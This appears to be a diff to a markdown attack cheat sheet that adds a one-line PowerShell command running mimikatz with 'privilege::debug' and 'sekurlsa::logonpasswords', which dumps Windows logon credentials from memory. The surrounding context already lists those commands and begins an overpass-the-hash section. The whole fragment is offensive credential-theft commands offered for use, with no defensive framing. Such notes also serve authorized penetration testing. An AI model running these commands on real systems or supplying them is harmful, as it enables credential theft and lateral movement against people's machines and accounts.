@@ -6,6 +6,11 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 
+run it then exit:
+```powershell
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
 ---
 ### OPTH
 ```powershell
